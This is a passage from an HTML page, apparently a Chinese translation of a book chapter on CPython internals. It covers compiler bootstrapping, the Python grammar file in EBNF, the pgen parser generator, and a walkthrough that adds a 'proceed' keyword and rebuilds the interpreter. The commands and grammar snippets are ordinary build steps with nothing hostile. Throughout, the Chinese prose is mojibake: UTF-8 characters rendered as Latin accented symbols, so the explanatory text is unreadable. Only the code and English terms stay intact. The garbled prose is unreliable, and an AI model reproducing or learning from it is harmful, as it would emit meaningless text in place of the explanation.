éœ€è¦ä¸€ä¸ªç¼–è¯‘å™¨æ¥æ‰§è¡Œä»»ä½•äº‹æƒ…ï¼Œæ‰€ä»¥å½“å¼€å‘æ–°è¯­è¨€æ—¶ï¼Œå®ƒä»¬é€šå¸¸é¦–å…ˆç”¨æ›´è€çš„ã€æ›´æˆç†Ÿçš„è¯­è¨€ç¼–å†™ã€‚</p><p>è¿˜æœ‰ä¸€äº›å¯ç”¨çš„å·¥å…·å¯ä»¥è¯»å–è¯­è¨€è§„èŒƒå¹¶åˆ›å»ºè§£æå™¨ã€‚æµè¡Œçš„ç¼–è¯‘å™¨-ç¼–è¯‘å™¨ï¼ˆcompiler-compilersï¼‰åŒ…æ‹¬ GNU Bisonã€Yacc å’Œ ANTLRã€‚</p><blockquote><p>å¦‚æœä½ æƒ³äº†è§£æœ‰å…³è§£æå™¨çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ <a href="https://github.com/lark-parser/lark">lark</a> é¡¹ç›®ã€‚Lark æ˜¯ä¸€ä¸ªç”¨ Python ç¼–å†™çš„ä¸Šä¸‹æ–‡æ— å…³è¯­æ³•è§£æå™¨ã€‚</p></blockquote><p>ç¼–è¯‘å™¨å¼•å¯¼çš„ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­æ˜¯ Go ç¼–ç¨‹è¯­è¨€ã€‚ç¬¬ä¸€ä¸ª Go ç¼–è¯‘å™¨æ˜¯ç”¨ C ç¼–å†™çš„ï¼Œç„¶åä¸€æ—¦ Go å¯ä»¥ç¼–è¯‘äº†ï¼Œå°±ç”¨ Go é‡å†™ç¼–è¯‘å™¨ã€‚</p><p>CPython ä¿ç•™äº† C è¯­è¨€çš„ä¼ ç»Ÿï¼›è®¸å¤šæ ‡å‡†åº“æ¨¡å—ï¼Œå¦‚ ssl æ¨¡å—æˆ–å¥—æ¥å­—æ¨¡å—ï¼Œéƒ½æ˜¯ç”¨ C ç¼–å†™çš„ï¼Œç”¨äºè®¿é—®ä½çº§æ“ä½œç³»ç»Ÿ APIã€‚Windows å’Œ Linux å†…æ ¸ä¸­ç”¨äº<a href="https://realpython.com/python-sockets/">åˆ›å»ºç½‘ç»œå¥—æ¥å­—</a>ã€<a href="https://realpython.com/working-with-files-in-python/">ä½¿ç”¨æ–‡ä»¶ç³»ç»Ÿ</a>æˆ–<a href="https://realpython.com/python-gui-with-wxpython/">ä¸æ˜¾ç¤ºå™¨äº¤äº’</a>çš„ API éƒ½æ˜¯ç”¨ C ç¼–å†™çš„ã€‚Python çš„å¯æ‰©å±•æ€§å±‚ä¸“æ³¨äº C è¯­è¨€æ˜¯æœ‰æ„ä¹‰çš„ã€‚</p><p>æœ‰ä¸€ä¸ªç”¨ Python ç¼–å†™çš„ Python ç¼–è¯‘å™¨ï¼Œç§°ä¸º PyPyã€‚PyPy çš„æ ‡å¿—æ˜¯ä¸€ä¸ª <a href="https://en.wikipedia.org/wiki/Ouroboros">è¡”å°¾è›‡</a>ï¼Œä»£è¡¨ç¼–è¯‘å™¨çš„è‡ªä¸¾æ€§è´¨ã€‚</p><p>Python äº¤å‰ç¼–è¯‘å™¨çš„å¦ä¸€ä¸ªç¤ºä¾‹æ˜¯ Jythonã€‚Jython æ˜¯ç”¨ Java ç¼–å†™çš„ï¼Œä» Python æºä»£ç ç¼–è¯‘æˆ Java å­—èŠ‚ç ã€‚ä¸ CPython å¯ä»¥è½»æ¾å¯¼å…¥ C åº“å¹¶ä» Python ä¸­ä½¿ç”¨å®ƒä»¬ä¸€æ ·ï¼ŒJython å¯ä»¥è½»æ¾å¯¼å…¥å’Œå¼•ç”¨ Java æ¨¡å—å’Œç±»ã€‚</p><p>åˆ›å»ºç¼–è¯‘å™¨çš„ç¬¬ä¸€æ­¥æ˜¯å®šä¹‰è¯­è¨€ã€‚ ä¾‹å¦‚ï¼Œä¸€ä¸‹ä¸æ˜¯æœ‰æ•ˆçš„ Pythonï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_example</span>() &lt;<span class="built_in">str</span>&gt; :</span><br><span class="line">&#123;</span><br><span class="line">    void* result = ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘å™¨åœ¨å°è¯•æ‰§è¡Œä¹‹å‰éœ€è¦ä¸¥æ ¼çš„è¯­è¨€è¯­æ³•ç»“æ„è§„åˆ™ã€‚</p><blockquote><p>å¯¹äºæœ¬ä¹¦çš„å…¶ä½™éƒ¨åˆ†ï¼Œ<code>./python</code> å°†æŒ‡ä»£ CPython çš„ç¼–è¯‘ç‰ˆæœ¬ã€‚ ä½†æ˜¯ï¼Œå®é™…å‘½ä»¤å°†å–å†³äºä½ çš„æ“ä½œç³»ç»Ÿã€‚</p><p>å¯¹äº Windowsï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt; python.exe</span><br></pre></td></tr></table></figure><p>å¯¹äº Linuxï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ ./python</span><br></pre></td></tr></table></figure><p>å¯¹äº macOSï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ ./python.exe</span><br></pre></td></tr></table></figure></blockquote><h2><span id="python-yu-yan-gui-fan">Python è¯­è¨€è§„èŒƒ</span></h2><p>CPython æºä»£ç ä¸­åŒ…å« Python è¯­è¨€çš„å®šä¹‰ã€‚è¿™ä¸ªæ–‡æ¡£æ˜¯æ‰€æœ‰ Python è§£é‡Šå™¨ä½¿ç”¨çš„å‚è€ƒè§„èŒƒã€‚</p><p>è¯¥è§„èŒƒé‡‡ç”¨äººç±»å¯è¯»å’Œæœºå™¨å¯è¯»çš„æ ¼å¼ã€‚æ–‡æ¡£é‡Œé¢æ˜¯å¯¹ Python è¯­è¨€çš„è¯¦ç»†è§£é‡Šã€‚åŒ…å«å…è®¸çš„å†…å®¹ä»¥åŠæ¯ä¸ªè¯­å¥çš„è¡Œä¸ºæ–¹å¼ã€‚</p><h3><span id="yu-yan-wen-dang">è¯­è¨€æ–‡æ¡£</span></h3><p>ä½äº <code>Doc/reference</code> ç›®å½•ä¸­çš„æ˜¯ Python è¯­è¨€ä¸­æ¯ä¸ªåŠŸèƒ½çš„ <a href="http://docutils.sourceforge.net/rst.html">reStructured-Text</a> è§£é‡Šã€‚è¿™äº›æ–‡ä»¶æ„æˆäº† <a href="https://docs.python.org/3/reference/">docs.python.org/3/reference</a> ä¸Šçš„å®˜æ–¹ Python å‚è€ƒæŒ‡å—ã€‚</p><p>ç›®å½•é‡Œé¢æ˜¯ä½ éœ€è¦äº†è§£æ•´ä¸ªè¯­è¨€ã€ç»“æ„å’Œå…³é”®å­—çš„æ–‡ä»¶ï¼š</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">cpython/Doc/reference/</span><br><span class="line">â”œâ”€â”€ compound_stmts.rst          å¤åˆè¯­å¥ï¼Œå¦‚ ifã€whileã€for å’Œå‡½æ•°å®šä¹‰</span><br><span class="line">â”œâ”€â”€ datamodel.rst               å¯¹è±¡ã€å€¼å’Œç±»å‹</span><br><span class="line">â”œâ”€â”€ executionmodel.rst          Pythonç¨‹åºçš„ç»“æ„</span><br><span class="line">â”œâ”€â”€ expressions.rst             Python è¡¨è¾¾å¼çš„å…ƒç´ </span><br><span class="line">â”œâ”€â”€ grammar.rst                 Python çš„æ ¸å¿ƒè¯­æ³•ï¼ˆå‚è€ƒ Grammar/Grammarï¼‰</span><br><span class="line">â”œâ”€â”€ import.rst                  å¯¼å…¥ç³»ç»Ÿ</span><br><span class="line">â”œâ”€â”€ index.rst                   è¯­è¨€å‚è€ƒç´¢å¼•</span><br><span class="line">â”œâ”€â”€ introduction.rst            å‚è€ƒæ–‡æ¡£ä»‹ç»</span><br><span class="line">â”œâ”€â”€ lexical_analysis.rst        è¯æ³•ç»“æ„ï¼Œå¦‚è¡Œã€ç¼©è¿›ã€æ ‡è®°å’Œå…³é”®å­—</span><br><span class="line">â”œâ”€â”€ simple_stmts.rst            ç®€å•çš„è¯­å¥ï¼Œå¦‚ assertã€importã€return å’Œ yield</span><br><span class="line">â””â”€â”€ toplevel_components.rst     æ‰§è¡Œ Python çš„æ–¹å¼çš„æè¿°ï¼Œå¦‚è„šæœ¬å’Œæ¨¡å—</span><br></pre></td></tr></table></figure><h3><span id="yi-ge-li-zi">ä¸€ä¸ªä¾‹å­</span></h3><p>åœ¨ <code>Doc/reference/compound_stmts.rst</code>ï¼Œä½ å¯ä»¥çœ‹åˆ°ä¸€ä¸ªå®šä¹‰ <code>with</code> è¯­å¥çš„ç®€å•ç¤ºä¾‹ã€‚</p><p><code>with</code> è¯­å¥æœ‰å¤šç§å½¢å¼ï¼Œæœ€ç®€å•çš„æ˜¯ä¸Šä¸‹æ–‡ç®¡ç†å™¨çš„å®ä¾‹åŒ–å’ŒåµŒå¥—çš„ä»£ç å—ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> x():</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>ä½ å¯ä»¥ä½¿ç”¨ <code>as</code> å…³é”®å­—å°†ç»“æœåˆ†é…ç»™å˜é‡ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> x() <span class="keyword">as</span> y:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>ä½ è¿˜å¯ä»¥ä½¿ç”¨é€—å·å°†ä¸Šä¸‹æ–‡ç®¡ç†å™¨é“¾æ¥åœ¨ä¸€èµ·ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> x() <span class="keyword">as</span> y, z() <span class="keyword">as</span> jk:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>æ–‡æ¡£åŒ…å«è¯­è¨€çš„äººç±»å¯è¯»è§„èŒƒï¼Œæœºå™¨å¯è¯»è§„èŒƒåŒ…å«åœ¨å•ä¸ªæ–‡ä»¶ <code>Grammar Grammar</code> ä¸­ã€‚</p><h3><span id="yu-fa-wen-jian">è¯­æ³•æ–‡ä»¶</span></h3><blockquote><p>æœ¬èŠ‚æŒ‡çš„æ˜¯â€œæ—§è§£æå™¨â€ä½¿ç”¨çš„è¯­æ³•æ–‡ä»¶ã€‚ åœ¨å‘å¸ƒæ—¶ï¼Œâ€œæ–°è§£æå™¨â€ï¼ˆPEG è§£æå™¨ï¼‰æ˜¯å®éªŒæ€§çš„ï¼Œå°šæœªå®Œæˆã€‚</p><p>å¯¹äº 3.8 åŠä»¥ä¸‹ç‰ˆæœ¬çš„ CPythonï¼Œé»˜è®¤ä½¿ç”¨ pgen è§£æå™¨ã€‚å¯¹äº CPython 3.9 åŠæ›´é«˜ç‰ˆæœ¬ï¼ŒPEG è§£æå™¨æ˜¯é»˜è®¤çš„ã€‚å¯ä»¥åœ¨å‘½ä»¤è¡Œä¸Šä½¿ç”¨ <code>-X oldparser</code> å¯ç”¨æ—§è§£æå™¨ã€‚</p><p>ä¸¤ä¸ªè§£æå™¨éƒ½ä½¿ç”¨ <code>Tokens</code> æ–‡ä»¶ã€‚</p></blockquote><p>è¯­æ³•æ–‡ä»¶ä»¥ä¸€ç§ç§°ä¸º<a href="https://en.wikipedia.org/wiki/Backus%E2%80%93Naur_form">å·´ç§‘æ–¯èŒƒå¼</a> (BNF) çš„ä¸Šä¸‹æ–‡ç¬¦å·ç¼–å†™ã€‚å·´ç§‘æ–¯èŒƒå¼ä¸æ˜¯ Python ç‰¹æœ‰çš„ï¼Œé€šå¸¸ç”¨ä½œè®¸å¤šå…¶ä»–è¯­è¨€ä¸­çš„è¯­æ³•ç¬¦å·ã€‚</p><p>ç¼–ç¨‹è¯­è¨€ä¸­è¯­æ³•ç»“æ„çš„æ¦‚å¿µå—åˆ° <a href="https://en.wikipedia.org/wiki/Syntactic_Structures">Noam Chomsky åœ¨ 1950 å¹´ä»£å…³äºå¥æ³•ç»“æ„çš„å·¥ä½œ</a>çš„å¯å‘ï¼</p><p>Python çš„è¯­æ³•æ–‡ä»¶ä½¿ç”¨æ‰©å±•å·´ç§‘æ–¯èŒƒå¼ï¼ˆEBNFï¼‰è§„èŒƒå’Œæ­£åˆ™è¡¨è¾¾å¼è¯­æ³•ã€‚å› æ­¤ï¼Œåœ¨è¯­æ³•æ–‡ä»¶ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨ï¼š</p><ul><li><code>*</code> ç”¨äºé‡å¤</li><li><code>+</code> è‡³å°‘é‡å¤ä¸€æ¬¡</li><li><code>[]</code> ç”¨äºå¯é€‰éƒ¨åˆ†</li><li><code>|</code> å¯¹äºæ›¿ä»£å“</li><li><code>()</code> ç”¨äºåˆ†ç»„</li></ul><p>ä¾‹å¦‚ï¼Œè€ƒè™‘å¦‚ä½•å®šä¹‰ä¸€æ¯å’–å•¡ï¼š</p><ul><li>å®ƒå¿…é¡»æœ‰ä¸€ä¸ªæ¯å­</li><li>å®ƒå¿…é¡»åŒ…æ‹¬è‡³å°‘ä¸€ç“¶æµ“ç¼©å’–å•¡ï¼ˆespressoï¼‰ï¼Œå¹¶ä¸”å¯ä»¥åŒ…å«å¤šä¸ª</li><li>å®ƒå¯ä»¥æœ‰ç‰›å¥¶ï¼Œä½†å¯é€‰</li><li>ä½ å¯ä»¥åœ¨å’–å•¡ä¸­åŠ å…¥å¤šç§ç‰›å¥¶ï¼Œå¦‚å…¨è„‚ã€è„±è„‚å’Œè±†å¥¶ï¼ˆsoyï¼‰</li></ul><p>åœ¨ EBNF ä¸­å®šä¹‰çš„å’–å•¡è®¢å•å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">coffee: &#x27;cup&#x27; (&#x27;espresso&#x27;)+ [&#x27;water&#x27;] [milk]</span><br><span class="line">milk: &#x27;full-fat&#x27; | &#x27;skimmed&#x27; | &#x27;soy&#x27;</span><br></pre></td></tr></table></figure><p>åœ¨æœ¬ç« ä¸­ï¼Œè¯­æ³•æ˜¯ç”¨é“è·¯å›¾å½¢è±¡åŒ–çš„ã€‚ è¿™å¼ å›¾æ˜¯å’–å•¡è¯­å¥çš„é“è·¯å›¾ï¼š</p><p><img src="https://user-images.githubusercontent.com/3297411/130769007-ecd75282-7d28-4d9f-9904-60cba7b83350.png" alt="coffee_statement"></p><p>åœ¨é“è·¯å›¾ä¸­ï¼Œæ¯ä¸ªå¯èƒ½çš„ç»„åˆå¿…é¡»ä»å·¦åˆ°å³æ’æˆä¸€æ¡çº¿ã€‚ å¯é€‰è¯­å¥å¯ä»¥è¢«ç»•è¿‡ï¼Œæœ‰äº›è¯­å¥å¯ä»¥å½¢æˆå¾ªç¯ã€‚</p><p>å¦‚æœåœ¨è¯­æ³•æ–‡ä»¶ä¸­æœç´¢ <code>with_stmt</code>ï¼Œå¯ä»¥çœ‹åˆ°å®šä¹‰ï¼š</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">with_stmt: &#x27;with&#x27; with_item (&#x27;,&#x27; with_item)*  &#x27;:&#x27; suite</span><br><span class="line">with_item: test [&#x27;as&#x27; expr]</span><br></pre></td></tr></table></figure><p>å¼•å·ä¸­çš„ä»»ä½•å†…å®¹éƒ½æ˜¯å­—ç¬¦ä¸²æ–‡å­—ï¼Œç§°ä¸ºç»ˆç«¯ï¼ˆterminalï¼‰ã€‚ç»ˆç«¯æ˜¯è¯†åˆ«å…³é”®å­—çš„æ–¹å¼ã€‚<code>with_stmt</code> æŒ‡å®šä¸ºï¼š</p><ol><li>ä» <code>with</code> å¼€å§‹</li><li>åé¢è·Ÿä¸€ä¸ª <code>with_item</code>ï¼Œå®ƒå¯ä»¥æ˜¯ <code>test</code>ï¼Œå’Œï¼ˆå¯é€‰çš„ï¼‰ <code>as</code> ä»¥åŠä¸€ä¸ªè¡¨è¾¾å¼ <code>expr</code></li><li>æ¥ç€æ˜¯ä¸€ä¸ªæˆ–å¤šä¸ª <code>with_item</code>ï¼Œæ¯ä¸ªéƒ½ç”¨é€—å·éš”å¼€</li><li>ä»¥ <code>:</code> ç»“å°¾</li><li>è·Ÿä¸€ä¸ª <code>suite</code></li></ol><p>åœ¨è¿™ä¸¤è¡Œä¸­å¼•ç”¨äº†å…¶ä»–ä¸‰ä¸ªå®šä¹‰ï¼š</p><p>â€¢ <code>suite</code> æ˜¯æŒ‡åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªè¯­å¥çš„ä»£ç å—â€¢ <code>test</code> æŒ‡çš„æ˜¯ä¸€ä¸ªè¢«è¯„ä¼°çš„ç®€å•çš„è¯­å¥â€¢ <code>expr</code> æŒ‡çš„æ˜¯ä¸€ä¸ªç®€å•çš„è¡¨è¾¾å¼</p><p>åœ¨é“è·¯å›¾ä¸­å¯è§†åŒ–ï¼Œ<code>with</code> è¯­å¥å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="https://user-images.githubusercontent.com/3297411/130769199-d7db516f-fb2e-4a7d-ae4e-ca34f5c49d78.png" alt="with_stmt"></p><p>ä½œä¸ºä¸€ä¸ªæ›´å¤æ‚çš„ä¾‹å­ï¼Œ<code>try</code> è¯­å¥å®šä¹‰ä¸ºï¼š</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">try_stmt: (&#x27;try&#x27; &#x27;:&#x27; suite</span><br><span class="line">           ((except_clause &#x27;:&#x27; suite)+</span><br><span class="line">            [&#x27;else&#x27; &#x27;:&#x27; suite]</span><br><span class="line">            [&#x27;finally&#x27; &#x27;:&#x27; suite] |</span><br><span class="line">           &#x27;finally&#x27; &#x27;:&#x27; suite))</span><br><span class="line">except_clause: &#x27;except&#x27; [test [&#x27;as&#x27; NAME]]</span><br></pre></td></tr></table></figure><p><code>try</code> è¯­å¥æœ‰ä¸¤ç§ç”¨é€”ï¼š</p><ol><li><code>try</code> å’Œä¸€ä¸ªæˆ–å¤šä¸ª <code>except</code> å­å¥ï¼Œç„¶åæ˜¯ä¸€ä¸ªå¯é€‰çš„ <code>else</code>ï¼Œç„¶åæ˜¯ä¸€ä¸ªå¯é€‰çš„ <code>finally</code></li><li><code>try</code> å’Œåªæœ‰ä¸€ä¸ª <code>finally</code> è¯­å¥</li></ol><p>æˆ–è€…ï¼Œåœ¨é“è·¯å›¾ä¸­å¯è§†åŒ–ï¼š</p><p><img src="https://user-images.githubusercontent.com/3297411/130769305-3fc27399-a211-48ae-92c9-780885c2ca03.png" alt="try_stmt"></p><p><code>try</code> è¯­å¥æ˜¯æ›´å¤æ‚ç»“æ„çš„ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­ã€‚</p><p>å¦‚æœä½ æƒ³è¯¦ç»†äº†è§£ Python è¯­è¨€ï¼Œè¯­æ³•åœ¨ <code>Grammar/Grammar</code> ä¸­å®šä¹‰ã€‚</p><h2><span id="shi-yong-jie-xi-qi-sheng-cheng-qi-the-parser-generator">ä½¿ç”¨è§£æå™¨ç”Ÿæˆå™¨ï¼ˆThe Parser Generatorï¼‰</span></h2><p>Python ç¼–è¯‘å™¨ä»ä¸ä½¿ç”¨è¯­æ³•æ–‡ä»¶æœ¬èº«ã€‚ç›¸åï¼Œè§£æå™¨è¡¨ç”±è§£æå™¨ç”Ÿæˆå™¨åˆ›å»ºã€‚å¦‚æœå¯¹è¯­æ³•æ–‡ä»¶è¿›è¡Œæ›´æ”¹ï¼Œåˆ™å¿…é¡»é‡æ–°ç”Ÿæˆè§£æå™¨è¡¨å¹¶é‡æ–°ç¼–è¯‘ CPythonã€‚</p><p>è§£æå™¨è¡¨æ˜¯æ½œåœ¨è§£æå™¨çŠ¶æ€çš„åˆ—è¡¨ã€‚å½“è§£ææ ‘å˜å¾—å¤æ‚æ—¶ï¼Œå®ƒä»¬ç¡®ä¿è¯­æ³•ä¸ä¼šæœ‰æ­§ä¹‰ã€‚</p><h2><span id="jie-xi-qi-sheng-cheng-qi">è§£æå™¨ç”Ÿæˆå™¨</span></h2><p>è§£æå™¨ç”Ÿæˆå™¨çš„å·¥ä½œåŸç†æ˜¯å°† EBNF è¯­å¥è½¬æ¢ä¸ºéç¡®å®šæ€§æœ‰é™è‡ªåŠ¨æœº (Non-deterministic Finite Automatonï¼ŒNFA)ã€‚NFA çŠ¶æ€å’Œè½¬æ¢è¢«è§£æå¹¶åˆå¹¶ä¸ºä¸€ä¸ªç¡®å®šæ€§æœ‰é™è‡ªåŠ¨æœº (Deterministic Finite Automatonï¼ŒDFA)ã€‚</p><p>DFA è¢«è§£æå™¨ç”¨ä½œè§£æè¡¨ã€‚è¿™ç§æŠ€æœ¯æ˜¯<a href="http://infolab.stanford.edu/~ullman/dragon/slides1.pdf">åœ¨æ–¯å¦ç¦å¤§å­¦å½¢æˆçš„</a>ï¼Œå¹¶åœ¨ 1980 å¹´ä»£å¼€å‘ï¼Œå°±åœ¨ Python å‡ºç°ä¹‹å‰ã€‚CPython çš„è§£æå™¨ç”Ÿæˆå™¨ <code>pgen</code> æ˜¯ CPython é¡¹ç›®ç‹¬æœ‰çš„ã€‚</p><p><code>pgen</code> åº”ç”¨ç¨‹åºåœ¨ Python 3.8 ä¸­ä» C é‡å†™ä¸º Pythonï¼Œåœ¨æ–‡ä»¶ <code>Parser/pgen/pgen.py</code> ä¸­ã€‚</p><p>å®ƒå¯é€šè¿‡ä»¥ä¸‹æ‰§è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./python -m Parser.pgen [grammar] [tokens] [graminit.h] [graminit.c]</span><br></pre></td></tr></table></figure><p>å®ƒé€šå¸¸ä»æ„å»ºè„šæœ¬æ‰§è¡Œï¼Œè€Œä¸æ˜¯ç›´æ¥æ‰§è¡Œã€‚</p><p>DFA å’Œ NFA æ²¡æœ‰è§†è§‰è¾“å‡ºï¼Œä½†æœ‰ä¸€ä¸ªå¸¦æœ‰æœ‰å‘å›¾è¾“å‡ºçš„ <a href="https://github.com/tonybaloney/cpython/tree/dot_pgen">CPython åˆ†æ”¯</a>ã€‚<code>decorator</code> è¯­æ³•åœ¨ <code>Grammar/Grammar</code> ä¸­å®šä¹‰ä¸ºï¼š</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">decorator: &#x27;@&#x27; dotted_name [ &#x27;(&#x27; [arglist] &#x27;)&#x27; ] NEWLINE</span><br></pre></td></tr></table></figure><p>è§£æå™¨ç”Ÿæˆå™¨åˆ›å»ºäº†ä¸€ä¸ªåŒ…å« 11 ä¸ªçŠ¶æ€çš„å¤æ‚ NFA å›¾ã€‚æ¯ä¸ªçŠ¶æ€éƒ½ç”¨æ•°å­—è¡¨ç¤ºï¼ˆåœ¨è¯­æ³•ä¸­æç¤ºå®ƒä»¬çš„åç§°ï¼‰ã€‚çŠ¶æ€è½¬ç§»è¢«ç§°ä¸ºâ€œå¼§â€ã€‚</p><p>DFA æ¯” NFA æ›´ç®€å•ï¼Œè·¯å¾„å‡å°‘äº†ï¼š</p><p><img src="https://user-images.githubusercontent.com/3297411/130769383-4c305c61-39c4-4239-934e-5fadf0fc5281.png" alt="decorator_DFA"></p><p>NFA å’Œ DFA å›¾ä»…ç”¨äºè°ƒè¯•å¤æ‚è¯­æ³•çš„è®¾è®¡ã€‚</p><p>æˆ‘ä»¬å°†ä½¿ç”¨é“è·¯å›¾ä»£æ›¿ DFA æˆ– NFA å›¾æ¥è¡¨ç¤ºè¯­æ³•ã€‚ä¾‹å¦‚ï¼Œæ­¤å›¾è¡¨ç¤º <code>decorator</code> è¯­å¥å¯ä»¥é‡‡ç”¨çš„è·¯å¾„ï¼š</p><p><img src="https://user-images.githubusercontent.com/3297411/130769434-73eb6a03-e7a1-4baa-bd65-e7b467b49ec9.png" alt="decorator_stmt"></p><h2><span id="chong-xin-sheng-cheng-yu-fa">é‡æ–°ç”Ÿæˆè¯­æ³•</span></h2><p>è¦æŸ¥çœ‹ <code>pgen</code> çš„è¿è¡Œæƒ…å†µï¼Œè®©æˆ‘ä»¬æ›´æ”¹éƒ¨åˆ† Python è¯­æ³•ã€‚åœ¨ <code>Grammar/Grammar</code> ä¸­æœç´¢ <code>pass_stmt</code> ä»¥æŸ¥çœ‹ <code>pass</code> è¯­å¥çš„å®šä¹‰ï¼š</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pass_stmt: &#x27;pass&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/3297411/130769494-9b57251f-38fe-4d3b-b8eb-73e49c831eda.png" alt="pass_stmt"></p><p>é€šè¿‡æ·»åŠ é€‰æ‹© <code>|</code> å’Œ <code>proceed</code> å­—é¢é‡ï¼Œæ›´æ”¹è¯¥è¡Œä»¥æ¥å—ç»ˆç«¯ï¼ˆå…³é”®å­—ï¼‰<code>'pass'</code> æˆ– <code>'proceed'</code> ä½œä¸ºå…³é”®å­—ï¼š</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pass_stmt: &#x27;pass&#x27; | &#x27;proceed&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/3297411/130769525-5107b366-f299-4299-a31d-8573304203ec.png" alt="pass_stmt_modified"></p><p>æ¥ä¸‹æ¥ï¼Œé€šè¿‡è¿è¡Œ <code>pgen</code> é‡å»ºè¯­æ³•æ–‡ä»¶ã€‚CPython å¸¦æœ‰è„šæœ¬æ¥è‡ªåŠ¨åŒ– <code>pgen</code>ã€‚</p><p>åœ¨ macOS å’Œ Linux ä¸Šï¼Œè¿è¡Œ <code>make regen-grammar</code>ï¼š</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">$ make regen-grammar</span><br></pre></td></tr></table></figure><p>å¯¹äº Windowsï¼Œä» PCBuild ç›®å½•è°ƒå‡ºå‘½ä»¤è¡Œå¹¶ä½¿ç”¨ <code>--regen</code> æ ‡å¿—è¿è¡Œ <code>build.bat</code>ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">build.bat --regen</span></span><br></pre></td></tr></table></figure><p>ä½ åº”è¯¥ä¼šçœ‹åˆ°ä¸€ä¸ªè¾“å‡ºï¼Œæ˜¾ç¤ºæ–°çš„ <code>Include/graminit.h</code> å’Œ <code>Python/graminit.c</code> æ–‡ä»¶å·²é‡æ–°ç”Ÿæˆã€‚</p><p>ä½¿ç”¨é‡æ–°ç”Ÿæˆçš„è§£æå™¨è¡¨ï¼Œå½“ä½ é‡æ–°ç¼–è¯‘ CPython æ—¶ï¼Œå®ƒå°†ä½¿ç”¨æ–°è¯­æ³•ã€‚</p><p>å¦‚æœä»£ç ç¼–è¯‘æˆåŠŸï¼Œä½ å¯ä»¥æ‰§è¡Œæ–°çš„ CPython äºŒè¿›åˆ¶æ–‡ä»¶å¹¶å¯åŠ¨ REPLã€‚</p><p>åœ¨ REPL ä¸­ï¼Œä½ ç°åœ¨å¯ä»¥å°è¯•å®šä¹‰ä¸€ä¸ªå‡½æ•°ã€‚ä¸è¦ä½¿ç”¨ pass è¯­å¥ï¼Œè€Œæ˜¯ä½¿ç”¨ä½ ç¼–è¯‘åˆ° Python è¯­æ³•ä¸­çš„ <code>proceed</code> å…³é”®å­—æ›¿ä»£ <code>pass</code>ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./python -X oldparser</span><br><span class="line">Python 3.9.0b1 (tags/v3.9.0b1:97fe9cf, May 19 2020, 10:00:00)</span><br><span class="line">[Clang 10.0.1 (clang-1001.0.46.4)] on darwin</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; def example():</span><br><span class="line">...    proceed</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; example()</span><br></pre></td></tr></table></figure><p>æ­å–œï¼Œä½ å·²ç»æ›´æ”¹äº† CPython è¯­æ³•å¹¶ç¼–è¯‘äº†ä½ è‡ªå·±çš„ CPython ç‰ˆæœ¬ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†æ¢ç´¢æ ‡è®°ï¼ˆtokensï¼‰åŠå…¶ä¸è¯­æ³•çš„å…³ç³»ã€‚</p><h3><span id="biao-ji-tokens">æ ‡è®°ï¼ˆTokensï¼‰</span></h3><p>é™¤äº† <code>Grammar</code> æ–‡ä»¶å¤¹ä¸­çš„è¯­æ³•æ–‡ä»¶ä¹‹å¤–ï¼Œè¿˜æœ‰ <code>Grammar/Tokens</code> æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«åœ¨åˆ†ææ ‘ä¸­ä½œä¸ºå¶èŠ‚ç‚¹æ‰¾åˆ°çš„æ¯ä¸ªå”¯ä¸€ç±»å‹ã€‚æ¯ä¸ªæ ‡è®°è¿˜æœ‰ä¸€ä¸ªåç§°å’Œä¸€ä¸ªç”Ÿæˆçš„å”¯ä¸€ IDã€‚åç§°ç”¨äºä½¿åœ¨åˆ†è¯å™¨ï¼ˆtokenizerï¼‰ä¸­æ›´å®¹æ˜“å¼•ç”¨ã€‚</p><blockquote><p><code>Grammar/Tokens</code> æ–‡ä»¶æ˜¯ Python 3.8 ä¸­çš„ä¸€é¡¹æ–°åŠŸèƒ½ã€‚</p></blockquote><p>ä¾‹å¦‚ï¼Œå·¦æ‹¬å·ç§°ä¸º <code>LPAR</code>ï¼Œåˆ†å·ç§°ä¸ºç§°ä¸º <code>SEMI</code>ã€‚ ä½ å°†åœ¨æœ¬ä¹¦åé¢çœ‹åˆ°è¿™äº›æ ‡è®°ï¼š</p><figure 